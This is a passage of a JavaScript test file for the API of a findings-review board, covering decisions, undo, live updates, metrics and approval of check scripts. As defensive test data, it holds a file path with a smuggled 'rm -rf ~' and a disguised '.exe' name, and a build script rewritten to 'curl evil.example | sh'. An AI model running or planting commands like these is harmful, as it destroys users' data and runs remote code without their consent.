// The board's API (design 0.1-c §3.3): what each endpoint returns, decide parity with the CLI, live updates, the
// decision-time metric (§3.5), check-profile approval (§4.3's channel) and label mode (§9.2). Synthetic projects.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { request } from 'node:http';
import { readFileSync, writeFileSync, readdirSync, mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { execFile } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { startBoard } from '../src/board/server.mjs';
import { DecisionClock, CAP_MS, IDLE_MS, relativeTime, keyOf, DECISION_KEYS, WORDS } from '../src/board/shared.mjs';
import * as L from '../src/ledger.mjs';
import * as P from '../src/project.mjs';
import { readMetrics, decisionTimes, metricsPath } from '../src/metrics.mjs';
import { smallProject, withAi, writeRun, HOSTILE } from './fixtures/board-project.mjs';
import { slugLabeller, LABELLER } from '../src/labels.mjs';
import { readGeneration } from '../src/state.mjs';

const CLI = fileURLToPath(new URL('../src/cli.mjs', import.meta.url));
const cli = (cwd, ...a) => new Promise(res => execFile('node', [CLI, ...a], { cwd, encoding: 'utf8' }, (err, stdout, stderr) => res({ code: err ? err.code : 0, stdout, stderr })));

async function board(p, opts = {}) {
  const b = await startBoard({ projectDir: p.root, ...opts });
  const origin = b.origin;
  const r = await fetch(`${origin}/api/session`, { method: 'POST', headers: { 'content-type': 'application/json', origin }, body: JSON.stringify({ code: b.newLink().split('#t=')[1] }) });
  const s = await r.json();
  const call = async (path, body) => {
    const res = await fetch(origin + path, body === undefined ? { headers: { 'x-nunchi-token': s.token } }
      : { method: 'POST', headers: { 'x-nunchi-token': s.token, 'content-type': 'application/json', origin }, body: JSON.stringify(body) });
    let json = null; try { json = await res.json(); } catch {}
    return { status: res.status, json };
  };
  return { b, call, session: s, token: s.token };
}
const decisions = nunchi => { try { return readdirSync(join(nunchi, 'decisions'), { recursive: true }).map(String).filter(f => f.endsWith('.json')).map(f => JSON.parse(readFileSync(join(nunchi, 'decisions', f), 'utf8'))); } catch { return []; } };
const gid = (p, rule) => p.findings.find(f => f.rule === rule).group;
// a project with AI findings: one claimed (not double-checked), one confirmed, grounded in a file of the app
function aiProject() {
  const p = smallProject();
  const ai = withAi(p, [
    { lens: 'L6', rule: 'L6.vague-error', scene: p.scenes[3], selector: 'main p.err', box: [40, 300, 400, 24], claim: `The error says nothing useful ${HOSTILE}`, status: 'claimed', severity: 'high', file: 'app/garden/page.tsx', line: 12 },
    { lens: 'L2', rule: 'L2.inconsistent-term', scene: p.scenes[0], selector: 'main > a.more', box: [40, 900, 120, 32], claim: 'Two words for one thing', status: 'confirmed', severity: 'medium', file: '../../outside.tsx', line: 3 },
  ]);
  return { ...p, ai };
}

test('decisions bump the generation after the decision files exist (a reader that saw the approval\'s bump first looks again)', () => {
  const p = smallProject();
  const led = P.loadLedger(p.nunchi, { root: p.root });
  const gen = led.st.files.generation;
  const g0 = readGeneration(gen);
  const { rows, groups } = P.ledgerView(led);
  const made = P.recordDecisions(led, { targets: P.resolveTargets(rows, groups, [gid(p, 'dead-href')], { prefix: false }), decision: 'fix', by: 'fixture', channel: 'cli-agent' });
  assert.equal(made.length, 1);
  assert.equal(readGeneration(gen), g0 + 2, 'one bump for the approval, and one after the decision files');
});

test('api: Copy path copies the whole path, never the clipped one shown; a path with a control character is shown marked and not copied or linked', async () => {
  const p = smallProject();
  const long = `app/${'deep/'.repeat(70)}page.tsx`;
  const ai = withAi(p, [
    { lens: 'L6', rule: 'L6.vague-error', scene: p.scenes[3], selector: 'main p.err', box: [40, 300, 400, 24], claim: 'a long path', status: 'claimed', file: long, line: 7 },
    { lens: 'L2', rule: 'L2.inconsistent-term', scene: p.scenes[0], selector: 'main > a.more', box: [40, 900, 120, 32], claim: 'a path with controls', status: 'claimed', file: 'app/page.tsx\n; rm -rf ~ \u202etxt.exe', line: 3 },
  ]);
  const { b, call } = await board(p);
  try {
    const a = (await call(`/api/groups/${ai[0].group}`)).json;
    assert.ok(long.length > 300 && a.code.file.length <= 300 && a.code.file.endsWith('…'), 'shown clipped');
    assert.equal(a.code.copy, long, 'copied whole');
    const c = (await call(`/api/groups/${ai[1].group}`)).json;
    assert.equal(c.code.copy, null, 'not copied');
    assert.equal(c.code.link, null, 'not linked');
    assert.ok(!/[\n\u202e]/.test(c.code.file) && c.code.file.includes('\ufffd'), 'shown with the controls marked');
  } finally { await b.close(); }
  const js = readFileSync(fileURLToPath(new URL('../src/board/assets/board.js', import.meta.url)), 'utf8');
  assert.match(js, /copyButton\(codeCopy, 'Copy path'\)/, 'the page copies code.copy');
});

test('api: a decision that lands while the model is being built is shown on the next request (the cache keeps the version read before the build)', async () => {
  const p = smallProject();
  let once = true;
  const g = gid(p, 'dead-href');
  const afterBuild = () => {
    if (!once) return;
    once = false;
    // a decision from the terminal, written between the board's read of the ledger and its caching the model
    const led = P.loadLedger(p.nunchi, { root: p.root });
    const { rows, groups } = P.ledgerView(led);
    P.recordDecisions(led, { targets: P.resolveTargets(rows, groups, [g], { prefix: false }), decision: 'fix', by: 'fixture', channel: 'cli-agent' });
  };
  const { b, call } = await board(p, { testHooks: { afterBuild } });
  try {
    const first = (await call(`/api/groups/${g}`)).json;
    assert.equal(first.decision, null, 'built before the decision');
    const next = (await call(`/api/groups/${g}`)).json;
    assert.equal(next.decision?.decision, 'fix', 'the next request builds again and shows it');
  } finally { await b.close(); }
});

test('api: a live claim is part of the version: written, it shows; expired by the reader\'s clock, it goes, without any other change', async () => {
  const p = smallProject();
  let t = Date.parse('2026-10-15T01:00:00Z');
  const { b, call } = await board(p, { now: () => t });
  const g = gid(p, 'dead-href');
  try {
    const v0 = (await call('/api/generation')).json.version;
    assert.equal((await call(`/api/groups/${g}`)).json.fixing, null);
    mkdirSync(join(b.stateDir, 'claims'), { recursive: true });
    writeFileSync(join(b.stateDir, 'claims', `${g}.json`), JSON.stringify({ declaredAgent: 'Fixture agent', startedAt: new Date(t - 5 * 60e3).toISOString(), lastRenewal: new Date(t).toISOString() }));
    const v1 = (await call('/api/generation')).json.version;
    assert.notEqual(v1, v0, 'a claim changes the version');
    assert.deepEqual((await call(`/api/groups/${g}`)).json.fixing, { agent: 'Fixture agent', minutes: 5 });
    t += 10 * 60e3;
    assert.equal((await call(`/api/groups/${g}`)).json.fixing.minutes, 15, 'its minutes are current');
    t += 25 * 60e3;                                             // 35 minutes since the last renewal: expired
    const v2 = (await call('/api/generation')).json.version;
    assert.ok(v2 !== v1 && v2.split('.').pop() === v0.split('.').pop(), `expired: the version changes back to no claim (${v0}, ${v1}, ${v2})`);
    assert.equal((await call(`/api/groups/${g}`)).json.fixing, null, 'and the group is no longer shown as being fixed');
    assert.deepEqual((await call('/api/summary')).json.now, []);
  } finally { await b.close(); }
});

test('words: the Decisions panel, the tab counts and the findings header count the same thing (groups by status)', async () => {
  const p = smallProject();
  assert.equal((await cli(p.root, 'decide', gid(p, 'dead-href'), 'fix')).code, 0);
  assert.equal((await cli(p.root, 'decide', gid(p, 'raw-error-text'), 'keep', '--reason', 'intended')).code, 0);
  assert.equal((await cli(p.root, 'decide', gid(p, 'target-size-min'), 'later')).code, 0);
  const { b, call } = await board(p);
  try {
    const s = (await call('/api/summary')).json, tabs = (await call('/api/groups?status=all')).json.counts;
    for (const k of ['open', 'to-fix', 'held', 'kept', 'dismissed', 'fixed']) assert.equal(s.byStatus[k], tabs[k] || 0, `${k}: panel and tab agree`);
    const head = (await cli(p.root, 'findings')).stdout.split('\n')[0];
    const b2 = s.byStatus;
    assert.match(head, new RegExp(`groups open ${b2.open} · to fix ${b2['to-fix']} · later ${b2.held} · fixed ${b2.fixed} · kept ${b2.kept} · not a problem ${b2.dismissed}$`), head);
    assert.deepEqual([b2['to-fix'], b2.kept, b2.held], [1, 1, 1]);
  } finally { await b.close(); }
});

test('api: /api/summary is the summary findings --json carries (one function)', async () => {
  const p = smallProject();
  const { b, call } = await board(p);
  try {
    const s = (await call('/api/summary')).json;
    const f = JSON.parse((await cli(p.root, 'findings', '--json')).stdout).summary;
    for (const k of ['verdict', 'bySeverity', 'byStatus', 'toDecide', 'toFix', 'handoff', 'since', 'running', 'fullCheck']) assert.deepEqual(s[k], f[k], k);
    assert.equal(s.verdict.text, 'Not yet · 1 blocker, 1 high: 2 to decide');
    assert.deepEqual(s.health.scenes, { total: 5, checked: 4, notSeen: 1, reasons: ['timeout'] });
    assert.equal(s.mode, 'board');
    assert.deepEqual(s.counts, { groups: 4, screens: 5 });
  } finally { await b.close(); }
});

test('api: /api/groups filters by status, lens and a plain substring, sections by kind, file, screen or lens; AI not double-checked apart', async () => {
  const p = aiProject();
  const { b, call } = await board(p);
  try {
    const all = (await call('/api/groups?status=all')).json;
    assert.equal(Object.keys(all.groups).length, 6, 'every group is in the map');
    assert.deepEqual(all.unchecked.flatMap(s => s.ids), [p.ai.find(i => i.verification.status === 'claimed').group], 'the claimed AI group sits apart');
    assert.ok(all.sections.flatMap(s => s.ids).includes(p.ai.find(i => i.verification.status === 'confirmed').group));
    assert.equal(all.sections[0].severity, 'blocker', 'worst first');
    const l3 = (await call('/api/groups?status=all&lens=L3')).json;
    assert.deepEqual(l3.sections.flatMap(s => s.ids), [gid(p, 'dead-href')]);
    const q = (await call(`/api/groups?status=all&q=${encodeURIComponent('typeerror')}`)).json;
    assert.deepEqual(q.sections.flatMap(s => s.ids), [gid(p, 'raw-error-text')], 'a plain, case-blind substring');
    const regex = (await call(`/api/groups?status=all&q=${encodeURIComponent('.*')}`)).json;
    assert.equal(regex.total, 0, 'no regular expressions');
    const byFile = (await call('/api/groups?status=all&group=file')).json;
    assert.ok(byFile.sections.some(s => s.title === 'app/garden/page.tsx') || byFile.unchecked.some(s => s.title === 'app/garden/page.tsx'));
    assert.ok(byFile.sections.some(s => s.title === 'No file known (found on a screen)'));
    const byLens = (await call('/api/groups?status=all&group=lens')).json;
    assert.ok(byLens.sections.some(s => /^L9 · ./.test(s.title)), 'lens sections carry the lens name');
    assert.ok(byLens.sections.some(s => s.title === 'L3'), 'a lens with no pack (a computed lens) by its id');
    const byScreen = (await call('/api/groups?status=all&group=screen')).json;
    assert.ok(byScreen.sections.some(s => s.title === 'Browser bundle'));
    // default order: severity, then reach
    const open = (await call('/api/groups')).json;
    assert.equal(open.status, 'open');
    const order = open.sections.flatMap(s => s.ids).map(id => open.groups[id].severity);
    const SEV = ['blocker', 'high', 'medium', 'low'];
    assert.deepEqual(order, [...order].sort((a, b) => SEV.indexOf(a) - SEV.indexOf(b)));
    assert.equal(open.groups[gid(p, 'dead-href')].screens, 3, 'reach: three screens');
  } finally { await b.close(); }
});

test('api: /api/groups/:id gives instances, screens with evidence addresses, history and an editor link only inside the project', async () => {
  const p = aiProject();
  const { b, call } = await board(p);
  try {
    const dead = (await call(`/api/groups/${gid(p, 'dead-href')}`)).json;
    assert.equal(dead.instances.length, 3);
    const sk = dead.instances[0].scene;
    assert.match(sk, /^0001\//);
    assert.match(dead.scenes[sk].img.url, /^\/evidence\/0001\/[^/]+\/full\.jpg$/);
    assert.equal(dead.instances[0].drawable.ok, true, 'the box comes from the scene\'s evidence index');
    assert.equal((await call(dead.scenes[sk].img.url)).status, 200);
    const claimed = p.ai.find(i => i.verification.status === 'claimed'), confirmed = p.ai.find(i => i.verification.status === 'confirmed');
    const a = (await call(`/api/groups/${claimed.group}`)).json;
    assert.match(a.code.link, /^vscode:\/\/file\/.+\/app\/garden\/page\.tsx:12$/);
    assert.equal(a.headline.includes('<script>'), true, 'app text is data, sent as it is (redacted, never parsed)');
    assert.equal(a.checked, false);
    const c = (await call(`/api/groups/${confirmed.group}`)).json;
    assert.equal(c.code.link, null, 'a file outside the project gets no link');
    assert.equal((await call('/api/groups/000000000000')).status, 404);
    // history: how each decision was made
    await cli(p.root, 'decide', gid(p, 'dead-href'), 'keep', '--reason', 'intended');
    const after = (await call(`/api/groups/${gid(p, 'dead-href')}`)).json;
    assert.deepEqual(after.history.map(h => [h.decision, h.channel, h.channelText]), [['keep', 'cli-agent', 'Recorded by your AI']]);
  } finally { await b.close(); }
});

test('api: /api/screens gives every screen of the latest run with its badge and numbered findings', async () => {
  const p = smallProject();
  const { b, call } = await board(p);
  try {
    const w = (await call('/api/screens')).json;
    assert.equal(w.run, '0001');
    assert.equal(w.scenes.length, 5);
    const lost = w.scenes.find(s => s.route === '/lost');
    assert.deepEqual([lost.badge, lost.kind, lost.img], ['Not seen', 'dark', null]);
    const home = w.scenes.find(s => s.id === '~.guest.normal.d');
    assert.equal(home.badge, '1 medium · 1 low');
    assert.deepEqual(home.findings.map(f => f.n), [1, 2]);
  } finally { await b.close(); }
});

test('api: /api/decide records through the ledger functions with channel board; confirmations for blockers, L9, >10 groups and unchecked AI fixes', async () => {
  const p = aiProject();
  const { b, call } = await board(p);
  try {
    const one = await call('/api/decide', { targets: [gid(p, 'dead-href')], decision: 'keep', reason: 'intended', ms: 3000 });
    assert.equal(one.status, 200, JSON.stringify(one.json));
    assert.deepEqual([one.json.decided, one.json.batch], ['Kept (intended)', null]);
    const files = decisions(p.nunchi);
    assert.deepEqual([files[0].channel, files[0].decision, files[0].reason, files[0].batch], ['board', 'keep', 'intended', undefined]);
    const ap = JSON.parse(readFileSync(join(p.nunchi, 'state', 'approved.json'), 'utf8'));
    assert.equal(ap.channels[L.approvalKey(files[0])], 'board');
    // a blocker or an L9 dismissal asks first
    const secret = await call('/api/decide', { targets: [gid(p, 'secret-in-client-bundle')], decision: 'false-positive', reason: 'not-a-problem' });
    assert.equal(secret.status, 409);
    assert.equal(secret.json.confirm.text, 'Mark 1 group Not a problem? 1 is a blocker, 1 is a safety or secret finding.');
    assert.equal(decisions(p.nunchi).length, 1, 'nothing written before the answer');
    // only a real true skips the question: "yes", 1, "true", [] or {} do not
    for (const confirmed of ['yes', 1, 'true', [], {}]) {
      const r = await call('/api/decide', { targets: [gid(p, 'secret-in-client-bundle')], decision: 'false-positive', reason: 'not-a-problem', confirmed });
      assert.equal(r.status, 409, `confirmed: ${JSON.stringify(confirmed)}`);
    }
    assert.equal(decisions(p.nunchi).length, 1, 'still nothing written');
    assert.equal((await call('/api/decide', { targets: [gid(p, 'secret-in-client-bundle')], decision: 'false-positive', reason: 'not-a-problem', confirmed: true })).status, 200);
    // fixing a claim nobody double-checked asks first
    const claimed = p.ai.find(i => i.verification.status === 'claimed');
    const fix = await call('/api/decide', { targets: [claimed.group], decision: 'fix', reason: null });
    assert.deepEqual([fix.status, fix.json.confirm?.text], [409, 'This hasn’t been double-checked. Fix anyway?']);
    // a batch: one file per group, one batch id
    const batch = await call('/api/decide', { targets: [gid(p, 'raw-error-text'), gid(p, 'target-size-min')], decision: 'hold', reason: null, ms: 9000 });
    assert.equal(batch.status, 200);
    assert.match(batch.json.batch, /^[\w-]+$/);
    assert.equal(decisions(p.nunchi).filter(d => d.batch === batch.json.batch).length, 2);
    // undo (Z) writes reopen
    assert.equal((await call('/api/decide', { targets: [gid(p, 'raw-error-text'), gid(p, 'target-size-min')], decision: 'reopen', reason: null, confirmed: true })).status, 200);
    const led = P.loadLedger(p.nunchi, { root: p.root });
    const st = id => P.ledgerView(led).groups.find(g => g.group === id).status;
    assert.deepEqual([st(gid(p, 'raw-error-text')), st(gid(p, 'dead-href')), st(gid(p, 'secret-in-client-bundle'))], ['open', 'kept', 'dismissed']);
  } finally { await b.close(); }
});

test('api: /api/decide validates everything it is sent, and refuses a group that is gone', async () => {
  const p = smallProject();
  const { b, call } = await board(p);
  try {
    const g = gid(p, 'dead-href');
    for (const [body, status] of [
      [{ targets: [], decision: 'fix', reason: null }, 400], [{ targets: ['x'], decision: 'fix', reason: null }, 400], [{ targets: [g, g], decision: 'fix', reason: null }, 400],
      [{ targets: [g], decision: 'delete', reason: null }, 400], [{ targets: [g], decision: 'keep', reason: null }, 400], [{ targets: [g], decision: 'keep', reason: 'because' }, 400],
      [{ targets: [g], decision: 'fix', reason: 'intended' }, 400], [{ targets: [g], decision: 'fix', reason: null, note: 'x'.repeat(501) }, 400],
      [{ targets: [g], decision: 'fix', reason: null, ms: -1 }, 400], [{ targets: [g], decision: 'fix', reason: null, ms: CAP_MS + 1 }, 400],
      [{ targets: ['abcdefabcdef'], decision: 'fix', reason: null }, 409],
    ]) assert.equal((await call('/api/decide', body)).status, status, JSON.stringify(body));
    assert.equal(decisions(p.nunchi).length, 0);
    // more than 10 groups dismissed at once asks first
    const many = smallProject();
    writeRun(many.root, '0002', { parent: '0001', scenes: many.scenes, findings: Array.from({ length: 11 }, (_, i) => ({ lens: 'L8', rule: 'target-size-min', severity: 'low', scene: many.scenes[0].id, route: '/', viewport: 'd', selector: `nav a.l${'x'.repeat(i + 1)}`, box: null, evidence: {} })) });
    const m = await board(many);
    try {
      const ids = Object.values((await m.call('/api/groups?status=all')).json.groups).filter(x => x.rule === 'target-size-min' && x.status === 'open').map(x => x.id);
      assert.ok(ids.length > 10, String(ids.length));
      const r = await m.call('/api/decide', { targets: ids, decision: 'false-positive', reason: 'not-a-problem' });
      assert.equal(r.status, 409);
      assert.match(r.json.confirm.text, new RegExp(`^Mark ${ids.length} groups Not a problem\\?`));
    } finally { await m.b.close(); }
  } finally { await b.close(); }
});

test('decide parity: a group holding an AI finding nobody double-checked is decided on each of its fingerprints, from the CLI and the board, so the decision counts', async () => {
  const project = () => {
    const p = smallProject();
    const ai = withAi(p, [
      { lens: 'L6', rule: 'L6.vague-error', scene: p.scenes[3], selector: 'main p.err', box: [40, 300, 400, 24], claim: 'The error says nothing useful', status: 'claimed', file: 'app/garden/page.tsx', line: 12 },
      { lens: 'L6', rule: 'L6.vague-error', scene: p.scenes[0], selector: 'main p.note', box: [40, 500, 400, 24], claim: 'This error says nothing either', status: 'claimed', file: 'app/garden/page.tsx', line: 30 },
    ]);
    return { ...p, ai };
  };
  const one = project(), two = project();
  const group = one.ai[0].group;
  assert.equal(one.ai[1].group, group, 'one group (one component)');
  const fps = one.ai.map(i => i.fp).sort();
  assert.notEqual(fps[0], fps[1], 'two fingerprints');
  const rowsOf = p => P.ledgerView(P.loadLedger(p.nunchi, { root: p.root })).rows.filter(r => r.group === group);
  // the CLI
  assert.equal((await cli(one.root, 'decide', group, 'fix')).code, 0);
  assert.deepEqual(decisions(one.nunchi).map(d => d.target.fp).sort(), fps, 'one decision per fingerprint');
  assert.deepEqual(rowsOf(one).map(r => r.status), ['to-fix', 'to-fix'], 'and it counts for each (a group decision would not)');
  // the board: the same, as one batch, and asked once as one group
  const { b, call } = await board(two);
  try {
    const ask = await call('/api/decide', { targets: [group], decision: 'fix', reason: null });
    assert.deepEqual([ask.status, ask.json.confirm?.text], [409, 'This hasn’t been double-checked. Fix anyway?']);
    const r = await call('/api/decide', { targets: [group], decision: 'fix', reason: null, confirmed: true, ms: 1500 });
    assert.equal(r.status, 200);
    assert.deepEqual(r.json.made.map(m => m.target.fp).sort(), fps);
    assert.ok(r.json.batch, 'one batch');
    assert.deepEqual(rowsOf(two).map(r => r.status), ['to-fix', 'to-fix']);
    const t = decisionTimes(readMetrics(metricsPath(b.stateDir)));
    assert.equal(t.singles.n, 1, 'one group decided is a single for the decision time');
  } finally { await b.close(); }
  // one batch on each side (the CLI's expansion too, so one undo or reopen takes both), the same files otherwise
  const batches = p => [...new Set(decisions(p.nunchi).map(d => d.batch))];
  for (const p of [one, two]) { const [x, ...more] = batches(p); assert.deepEqual([typeof x, more], ['string', []], 'one batch id, the CLI\'s expansion included'); assert.match(x, /^[\w-]+$/); }
  const strip = ({ id, at, channel, by, batch, ...rest }) => ({ ...rest, batched: typeof batch === 'string' });
  assert.deepEqual(decisions(one.nunchi).map(strip).sort((a, b) => (a.target.fp < b.target.fp ? -1 : 1)), decisions(two.nunchi).map(strip).sort((a, b) => (a.target.fp < b.target.fp ? -1 : 1)));
});

test('api: /api/undo reopens exactly the targets of the decisions named, only while each is still what its target shows', async () => {
  const p = smallProject();
  const ai = withAi(p, [
    { lens: 'L6', rule: 'L6.vague-error', scene: p.scenes[3], selector: 'main p.err', box: [40, 300, 400, 24], claim: 'one', status: 'claimed', file: 'app/garden/page.tsx', line: 12 },
    { lens: 'L6', rule: 'L6.vague-error', scene: p.scenes[0], selector: 'main p.note', box: [40, 500, 400, 24], claim: 'two', status: 'claimed', file: 'app/garden/page.tsx', line: 30 },
  ]);
  const { b, call } = await board(p);
  const status = () => P.ledgerView(P.loadLedger(p.nunchi, { root: p.root })).rows.filter(r => r.group === ai[0].group).map(r => r.status);
  try {
    // an unchecked AI group, decided on its fingerprints: undo reopens those fingerprints (a group reopen would not)
    const r = await call('/api/decide', { targets: [ai[0].group], decision: 'fix', reason: null, confirmed: true });
    assert.deepEqual(status(), ['to-fix', 'to-fix']);
    const u = await call('/api/undo', { decisions: r.json.made.map(m => m.id) });
    assert.equal(u.status, 200);
    assert.deepEqual(u.json.made.map(m => m.target), r.json.made.map(m => m.target), 'the same targets');
    assert.deepEqual(status(), ['open', 'open']);
    assert.equal((await call('/api/undo', { decisions: r.json.made.map(m => m.id) })).status, 409, 'undone already');
    // decided again since (in the terminal): Z must not reopen that newer decision
    const g = gid(p, 'dead-href');
    const k = await call('/api/decide', { targets: [g], decision: 'keep', reason: 'intended' });
    assert.equal((await cli(p.root, 'decide', g, 'fix')).code, 0);
    const late = await call('/api/undo', { decisions: k.json.made.map(m => m.id) });
    assert.deepEqual([late.status, late.json.stale], [409, true]);
    assert.equal(P.ledgerView(P.loadLedger(p.nunchi, { root: p.root })).rows.find(r => r.group === g).status, 'to-fix', 'the terminal\'s decision stands');
    // only decisions made in the board, by id
    const cliMade = decisions(p.nunchi).find(d => d.channel === 'cli-agent');
    assert.equal((await call('/api/undo', { decisions: [cliMade.id] })).status, 409, 'a decision from the terminal is not undone here');
    for (const bad of [{}, { decisions: [] }, { decisions: ['../x'] }, { decisions: [g] }]) assert.equal((await call('/api/undo', bad)).status, 400, JSON.stringify(bad));
  } finally { await b.close(); }
  const js = readFileSync(fileURLToPath(new URL('../src/board/assets/board.js', import.meta.url)), 'utf8');
  assert.match(js, /function hideToast\(\) \{[^}]*S\.undo = null;/, 'undo lasts as long as its toast');
});

test('decide parity: the board and nunchi decide write the same decision through the same functions; only who-and-how differ', async () => {
  const one = smallProject(), two = smallProject();
  const g = gid(one, 'raw-error-text');
  assert.equal(g, gid(two, 'raw-error-text'), 'the same project twice');
  assert.equal((await cli(one.root, 'decide', g, 'keep', '--reason', 'intended', '--note', 'copy is final')).code, 0);
  const { b, call } = await board(two);
  try { assert.equal((await call('/api/decide', { targets: [g], decision: 'keep', reason: 'intended', note: 'copy is final' })).status, 200); }
  finally { await b.close(); }
  const [a] = decisions(one.nunchi), [c] = decisions(two.nunchi);
  const strip = ({ id, at, channel, by, batch, ...rest }) => rest;
  assert.deepEqual(strip(a), strip(c));
  assert.deepEqual([a.channel, c.channel], ['cli-agent', 'board']);
  for (const p of [one, two]) {
    const led = P.loadLedger(p.nunchi, { root: p.root });
    const row = P.ledgerView(led).rows.find(r => r.group === g);
    assert.deepEqual([row.status, row.decision.decision, row.decision.reason, row.decision.verified], ['kept', 'keep', 'intended', true]);
  }
  const human = p => P.ledgerView(P.loadLedger(p.nunchi, { root: p.root })).rows.find(r => r.group === g).decision.human;
  assert.deepEqual([human(one), human(two)], [false, true], 'the agent\'s dismissal waits for the person; the board\'s is the person\'s');
  // and the same file layout: folder = target, name = id
  for (const p of [one, two]) assert.equal(readdirSync(join(p.nunchi, 'decisions')).join(), `group-${g}`);
});

test('api: /api/confirm confirms the dismissals the agent recorded, in one batch; a stale list is refused', async () => {
  const p = smallProject();
  await cli(p.root, 'decide', gid(p, 'raw-error-text'), 'keep', '--reason', 'intended');
  const { b, call } = await board(p);
  try {
    const s = (await call('/api/summary')).json;
    assert.equal(s.confirm.length, 1);
    assert.deepEqual([s.confirm[0].channel, s.confirm[0].decision, s.confirm[0].severity], ['cli-agent', 'keep', 'high']);
    assert.equal((await call('/api/confirm', { keys: ['nope:' + '0'.repeat(64)] })).status, 409);
    assert.equal((await call('/api/confirm', { keys: [] })).status, 400);
    assert.equal((await call('/api/confirm', { keys: s.confirm.map(c => c.key) })).status, 200);
    const after = (await call('/api/summary')).json;
    assert.equal(after.confirm.length, 0);
    assert.ok(!after.verdict.text.includes('to confirm'));
  } finally { await b.close(); }
});

test('api: /api/approve-checks approves the check profile shown, once, as the person; a changed profile asks again', async () => {
  const p = smallProject();
  writeFileSync(join(p.root, 'package.json'), JSON.stringify({ name: 'x', scripts: { build: 'next build', prebuild: 'node gen.js', test: 'vitest run', dev: 'next dev', helper: 'node helper.js' }, packageManager: 'pnpm@9.0.0' }));
  const { b, call } = await board(p);
  try {
    let s = (await call('/api/summary')).json;
    assert.deepEqual(Object.keys(s.checks.profile.scripts).sort(), ['build', 'prebuild', 'test'], 'the check scripts and their pre/post lines, nothing else');
    assert.deepEqual(s.checks.profile.serve, { dev: 'next dev' }, 'and the line `fix --serve dev` may start the app with (M3), shown on the card too');
    assert.equal(s.checks.profile.others, 1, 'and how many other scripts the approval covers (a check may call them)');
    assert.deepEqual([s.checks.requested, s.checks.approved], [false, false], 'shown only when the fix loop asks (M3)');
    mkdirSync(join(p.nunchi, 'state'), { recursive: true });
    writeFileSync(join(p.nunchi, 'state', 'checks-request.json'), '{"schema":1}');
    s = (await call('/api/summary')).json;
    assert.equal(s.checks.requested, true);
    assert.equal((await call('/api/approve-checks', { profile: '0'.repeat(32) })).status, 409, 'not the profile shown');
    assert.equal((await call('/api/approve-checks', { profile: s.checks.profile.hash })).status, 200);
    const doc = JSON.parse(readFileSync(join(p.nunchi, 'state', 'scripts-approved.json'), 'utf8'));
    assert.equal(doc.profiles[s.checks.profile.hash].channel, 'board');
    assert.equal((await call('/api/summary')).json.checks.approved, true);
    writeFileSync(join(p.root, 'package.json'), JSON.stringify({ name: 'x', scripts: { build: 'next build && curl evil.example | sh', test: 'vitest run' } }));
    assert.equal((await call('/api/summary')).json.checks.approved, false, 'a changed line asks again');
  } finally { await b.close(); }
});

test('api: live updates — the stream says when the ledger changes (a CLI decision, a decision that came through git); /api/generation polls the same', { timeout: 30000 }, async () => {
  const p = smallProject();
  const { b, call, token } = await board(p);
  try {
    const events = [];
    const req = request({ host: '127.0.0.1', port: b.port, path: '/api/live', headers: { host: `127.0.0.1:${b.port}`, 'x-nunchi-token': token } }, r => { r.setEncoding('utf8'); r.on('data', d => { for (const m of d.matchAll(/data: (\{.*\})/g)) events.push(JSON.parse(m[1]).version); }); });
    req.end();
    const wait = async (n, ms = 8000) => { const t = Date.now(); while (events.length < n && Date.now() - t < ms) await new Promise(r => setTimeout(r, 100)); return events.length >= n; };
    assert.ok(await wait(1), 'the current version at once');
    const v0 = (await call('/api/generation')).json.version;
    assert.equal(events[0], v0);
    assert.equal((await cli(p.root, 'decide', gid(p, 'dead-href'), 'fix')).code, 0);
    assert.ok(await wait(2), 'a decision from the terminal shows up');
    assert.notEqual(events.at(-1), v0);
    assert.equal((await call('/api/generation')).json.version, events.at(-1), 'polling sees the same version');
    // a decision file that arrived through git bumps no generation; the decision folders are watched too
    const d = L.buildDecision({ target: { group: gid(p, 'target-size-min') }, decision: 'hold', by: 'someone else' });
    L.saveDecision(join(p.nunchi, 'decisions'), d);
    assert.ok(await wait(3), 'a decision from git shows up');
    req.destroy();
  } finally { await b.close(); }
});

test('decision time (§3.5): kept per decision or batch, Later apart, once per id, stable JSON with no clock; nunchi trust prints it', async () => {
  const p = smallProject();
  const { b, call } = await board(p);
  try {
    await call('/api/decide', { targets: [gid(p, 'dead-href')], decision: 'fix', reason: null, ms: 4200 });
    await call('/api/decide', { targets: [gid(p, 'raw-error-text'), gid(p, 'target-size-min')], decision: 'fix', reason: null, ms: 9000 });
    await call('/api/decide', { targets: [gid(p, 'raw-error-text')], decision: 'hold', reason: null, ms: 1500 });
    await call('/api/decide', { targets: [gid(p, 'raw-error-text')], decision: 'reopen', reason: null, ms: 1000, confirmed: true });
    await call('/api/decide', { targets: [gid(p, 'raw-error-text')], decision: 'fix', reason: null });
  } finally { await b.close(); }
  const file = metricsPath(join(p.nunchi, 'state'));
  const doc = readMetrics(file);
  assert.deepEqual(Object.values(doc.singles).map(e => e.ms), [4200]);
  assert.deepEqual(Object.values(doc.batches), [{ ms: 9000, size: 2 }]);
  assert.deepEqual(Object.values(doc.later).map(e => e.ms), [1500]);
  const text = readFileSync(file, 'utf8');
  assert.ok(!/"at"|T\d\d:\d\d/.test(text), 'no time of day, only durations');
  assert.deepEqual(JSON.parse(text), doc);
  const t = decisionTimes(doc);
  assert.deepEqual([t.singles.n, t.singles.median, t.batches.groups, t.later.n], [1, 4200, 2, 1]);
  const out = await cli(p.root, 'trust');
  assert.match(out.stdout, /decision time \(board\): singles median 4\.2 s, p90 4\.2 s \(1\)/);
  assert.match(out.stdout, /batches median 9 s, p90 9 s \(1 batches, 2 groups\)/);
  assert.match(out.stdout, /later, apart: median 1\.5 s \(1\)/);
});

test('keys: a shortcut is its place on the keyboard and Shift (any layout, Caps Lock); ? and / are the characters', () => {
  const cases = [
    [{ key: 'f', code: 'KeyF' }, 'f'], [{ key: 'ㄹ', code: 'KeyF' }, 'f'], [{ key: 'W', code: 'KeyW', shiftKey: false }, 'w'], [{ key: 'W', code: 'KeyW', shiftKey: true }, 'W'],
    [{ key: 'w', code: 'KeyW', shiftKey: true }, 'W'], [{ key: 'ㅈ', code: 'KeyW', shiftKey: true }, 'W'], [{ key: 'X', code: 'KeyX' }, 'x'], [{ key: 'z', code: 'KeyZ' }, 'z'],
    [{ key: '?', code: 'Slash', shiftKey: true }, '?'], [{ key: '/', code: 'Slash' }, '/'], [{ key: '?', code: 'Minus', shiftKey: true }, '?'], [{ key: '/', code: 'Digit7', shiftKey: true }, '/'],
